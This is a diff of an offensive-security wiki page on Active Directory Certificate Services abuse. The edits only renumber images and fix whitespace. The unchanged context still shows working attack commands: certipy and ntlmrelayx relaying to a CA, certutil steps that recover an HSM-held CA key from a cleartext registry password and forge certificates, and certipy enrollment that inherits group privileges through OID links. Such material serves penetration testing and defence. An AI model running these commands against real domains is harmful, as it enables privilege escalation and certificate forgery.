@@ -170,7 +170,7 @@ Notable permissions applicable to certificate templates include:
 
 An example of a privesc like the previous one:
 
-<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
 
 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
 
@@ -412,7 +412,7 @@ Another limitation of NTLM relay attacks is that **an attacker-controlled machin
 Certify.exe cas
 ```
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:
 
@@ -420,14 +420,14 @@ The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Author
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
 
-<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
 
-<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
 
 #### Abuse with Certify
 
@@ -638,9 +638,9 @@ Certificate Authorities
 
 ### Abuse Scenario
 
-It need to setup a relay server: 
+It need to setup a relay server:
 
-``` bash
+```bash
 $ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -663,7 +663,7 @@ Note: For domain controllers, we must specify `-template` in DomainController.
 
 Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
 
-``` bash
+```bash
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
 
@@ -673,7 +673,7 @@ $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -s
 
 Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
 
-If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM. 
+If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
 
 This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
 
@@ -683,7 +683,7 @@ Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-
 
 If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
 
-In first, you need to obtain the CA certificate (this is public) and then:  
+In first, you need to obtain the CA certificate (this is public) and then:
 
 ```cmd
 # import it to the user store with CA certificate
@@ -695,14 +695,13 @@ $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common 
 
 Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
 
-
 ## OID Group Link Abuse - ESC13
 
 ### Explanation
 
 The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
 
-In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group. 
+In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.
 
 Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
 
@@ -732,14 +731,13 @@ OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 
 Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.
 
-If `John` have have permission to enroll `VulnerableTemplate`,  the user can inherit the privileges of `VulnerableGroup` group. 
+If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.
 
 All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
 
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
-
 
 ## Compromising Forests with Certificates Explained in Passive Voice
 
